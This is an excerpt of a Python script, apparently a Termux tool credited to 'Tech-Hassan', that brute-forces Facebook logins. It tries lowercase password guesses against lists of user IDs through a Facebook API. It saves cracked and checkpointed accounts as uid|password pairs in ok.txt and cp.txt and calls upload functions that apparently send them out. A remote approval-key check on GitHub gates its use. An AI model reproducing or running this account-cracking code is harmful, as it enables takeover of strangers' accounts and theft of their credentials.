...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/Tech-Hassan/Approve/blob/main/Approval.txt"])
	exit(" [*] FACEBOOK :  Ãhmâd Kïñg ")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN MESSENGER🔰Hassan")
	subprocess.check_output(["am", "start", "https://www.facebook.com/safdar.baloch.395"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/Tech-Hassan/Approve/main/Approval.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : Ãhmed Kïñg
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB GROUP : Aking Termux Command 
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : Tech-Hassan
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWhatsapp  : +92***
\033[1;90m══════════════════════════════════════════════════
    """)
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [Hassan_OLD] : %s/%s -> \033[0;92m [ Hassan-OK:%s ]- \033[0;91m[Hassan-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [Hassan-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[Hassan-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [Hassan-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
